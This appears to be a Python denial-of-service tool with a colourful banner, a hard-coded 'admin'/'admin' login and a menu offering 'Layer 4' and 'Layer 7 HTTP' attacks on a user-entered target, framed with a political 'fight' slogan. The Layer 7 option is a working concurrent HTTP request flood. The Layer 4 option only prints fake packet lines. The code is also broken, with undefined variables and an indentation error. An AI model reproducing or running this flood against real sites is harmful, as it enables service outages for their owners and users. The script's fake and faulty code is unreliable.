#!usr/bin/python3.12
# _*_ coding: utf-8 _*_
import aiohttp
import asyncio
import time
import os
import random
import sys
from colorama import Fore, Style, init

# Inisialisasi colorama
init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")
    attemps = 0
    os.system("clear")
# ============================
#   Typing Animation
# ============================
def typewriter(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print(massage)  # newline

# ============================
#   Banner ASCII
# ============================
def display_header():
    header_lines = [
    Fore.RED + "╔═══════════════════════════════════════════════════════════════════════╗",     
    Fore.RED + "║                                                                       " + Fore.RED + "║",
    Fore.RED + "║" + Fore.YELLOW + "          ╔══" + Fore.MAGENTA + "         ╔═══════╗" + Fore.GREEN + "    ╔════╗ ╔════╗" + Fore.WHITE + " ╔══╗" + Fore.BLUE + " ╔═══╗     ╔══╗   " + Fore.RED + "║",
    Fore.RED + "║" + Fore.YELLOW + "          ███ ║" + Fore.MAGENTA + "      ████████ ║" + Fore.GREEN + "   █████ ║█████ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ████ ║    ██ ║   " + Fore.RED + "║",
    Fore.RED + "║" + Fore.YELLOW + "         ██ ██ ║" + Fore.MAGENTA + "     ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ██ ║   ██ ║   " + Fore.RED + "║",
    Fore.RED + "║" + Fore.YELLOW + "        ██ ║ ██ ║" + Fore.MAGENTA + "    ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██  ██ ║  ██ ║   " + Fore.RED + "║",
    Fore.RED + "║" + Fore.YELLOW + "       ██ ╚══ ██ ║" + Fore.MAGENTA + "   ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║ ██ ║ ██ ║   " + Fore.RED + "║",
    Fore.RED + "║" + Fore.YELLOW + "      ███████  ██ ║" + Fore.MAGENTA + "  ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██═╝ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║  ██ ║██ ║   " + Fore.RED + "║",
    Fore.RED + "║" +  Fore.YELLOW + "     ██ ║       ██ ║" + Fore.MAGENTA + " ██ ╚════██ ║" + Fore.GREEN + " ██ ║      ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║   ██ ██ ║   " + Fore.RED + "║",
    Fore.RED + "║" +  Fore.YELLOW + "    ██═╝         ██═╝" + Fore.MAGENTA + "████████═╝" + Fore.GREEN + "   ██═╝      ██═╝" + Fore.WHITE + " ██═╝" + Fore.BLUE + " ██═╝    ████═╝   " + Fore.RED + "║",
    Fore.RED + "║                                                                       " +  Fore.RED + "║",
    Fore.RED + "║" + Fore.RED + "           ██═╗    ██═╗" + Fore.WHITE + "     ████═╗" + Fore.BLUE + "      ███████ ║" + Fore.YELLOW + "  ██═╗   ██═╗         " + Fore.RED + "║",
    Fore.RED + "║" + Fore.RED + "           ██ ║    ██ ║" + Fore.WHITE + "    ██ ╔═██ ║" + Fore.BLUE + "   ██ ╔═════╝" + Fore.YELLOW + "  ██ ║  ██ ║          " + Fore.RED + "║",
    Fore.RED + "║" + Fore.RED + "           ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║██ ║            " + Fore.RED + "║",
    Fore.RED + "║" + Fore.RED + "           ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ████ ║              " + Fore.RED + "║",
    Fore.RED + "║" + Fore.RED + "           ██████████ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║██ ║            " + Fore.RED + "║",
    Fore.RED + "║" + Fore.RED + "           ██ ╔════██ ║" + Fore.WHITE + "   ██████ ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║  ██ ║          "  + Fore.RED + "║",
    Fore.RED + "║" + Fore.RED + "           ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "   ███████ ║" + Fore.YELLOW + "  ██ ║   ██ ║         " + Fore.RED + "║",
    Fore.RED + "║" + Fore.RED + "           ╚══╝    ╚══╝" + Fore.WHITE + "   ╚══╝   ╚══╝" + Fore.BLUE + "   ╚═══════╝" + Fore.YELLOW + "  ╚══╝   ╚══╝         " + Fore.RED + "║",
    Fore.RED + "║                                                                       " + Fore.RED + "║",
    Fore.RED + "╚═══════════════════════════════════════════════════════════════════════╝",     
    ]
    for line in header_lines:
        print(line)  
    time.sleep(0.0015)  # typing effect
# ============================
#   Layer 4 Stress Tes
# ============================
def layer4_attack(target_ip, duration):
    print(Fore.RED + f"\n[🔥] Starting Layer 4 attack to {target_ip} for {duration} seconds...\n")
    start_time = time.time()
    while time.time() - start_time < duration:
        port = random.randint(20, 65535)
        psize = random.randint(64, 1500)
        print(Fore.WHITE + f"[L4] \033[100m{Fore.WHITE}ADMIN-HACK\033[0m {Fore.BLUE} SEN-PACKET {Fore.GREEN} {psize} {Fore.RED} BYTES TO {Fore.YELLOW}{target_ip}{Fore.CYAN}:{port} {Fore.WHITE}Running")
        print(Fore.RED + f"[L4] {Fore.YELLOW}ADMIN-HACK {Fore.CYAN} SEN-PACKET {Fore.YELLOW} {psize} {Fore.MAGENTA} BYTES TO \033[104m{Fore.WHITE}{target_ip}:{port}\033[0m {Fore.GREEN}Running")
        time.sleep(0.2)
    print(Fore.GREEN + "\n[✔] Layer 4 attack finished!\n")

# ============================
#   Layer 7 Stress Test
# ============================
async def worker(session, url, stop_time):
    hits = 0
    while time.time() < stop_time:
        try:
            async with session.get(url) as resp:
                await resp.text()
                hits += 1
                print(Fore.RED + f"[L7] {Fore.BLUE}  \033[103mADMIN-HACK\033[0m {Fore.YELLOW}REQUEST-SENT {Fore.RED} {url} {Fore.YELLOW}Running ::")
                print(Fore.WHITE + f"[L7] {Fore.YELLOW}  ADMIN-HACK {Fore.BLUE}REQUEST-SENT \033[104m{Fore.YELLOW}{url}\033[0m {Fore.GREEN}Running :")
        except:
            print(Fore.RED + f"[L7] Request failed -> {url} 🇵🇸")
    return hits

async def layer7_attack(url, concurrency, duration):
    stop_time = time.time() + duration
    async with aiohttp.ClientSession() as session:
        tasks = [worker(session, url, stop_time) for _ in range(concurrency)]
        results = await asyncio.gather(*tasks)
    print(Fore.GREEN + f"\n[✔] Total requests sent: {sum(results)}")

# ============================
#   Menu Utama
# ============================
def main():
    clear()
    display_header()
    print(f"\r\033[97m╔{'═' * 71}╗")
    print(f"\r\033[97m║\033[32m   v.1.0{' ' * 63}\033[97m║")
    print(f"\r\033[97m║\033[32m   https://kunkaffa@gmail.com{' ' * 42}\033[97m║")
    print(f"\r\033[97m╚{'═' * 71}╝")
    while attemps < 100:
        print("\033[103m┏━━KunFayz━━⬣")
        username = input("\033[103m┗> Enter your username: \033[103m ")
        password = input("\033[32m┗> Enter your password: \033[0m")

        if username == 'admin' and password == 'admin':
             print("\033[100m \033[31m••> ZONA FIGHT ZI0NIST \033[0m")
             break
         else:
             print('Incorrect credentials. Check if you have Caps lock on and try again.')
             attemps += 1
             continue

    print(Fore.CYAN + "┏━━KunFayz━━⬣")
    print(Fore.CYAN + "┗> " + Fore.YELLOW + "1. Layer 4 Attack")
    print(Fore.CYAN + "┗> " + Fore.YELLOW + "2. Layer 7 HTTP Attack")
    choice = input("\033[104m \033[97mSelect option: \033[0m")

    if choice == "1":
        print(Fore.CYAN + "┏━━KunFayz━━⬣")
        target_ip = input(Fore.CYAN + "┗> Target IP: ")
        duration = int(input(Fore.CYAN + "┗> Duration (seconds): "))
        layer4_attack(target_ip, duration)

    elif choice == "2":
        print(Fore.CYAN + "┏━━KunFayz━━⬣")
        url = input(Fore.CYAN + "┗> Target URL: ")
        concurrency = int(input(Fore.CYAN + "┗> Concurrent connections: "))
        duration = int(input(Fore.CYAN + "┗> Duration (seconds): "))
        asyncio.run(layer7_attack(url, concurrency, duration))

    else:
        print(Fore.RED + "\n[!] Invalid choice.")

if __name__ == "__main__":
    main()
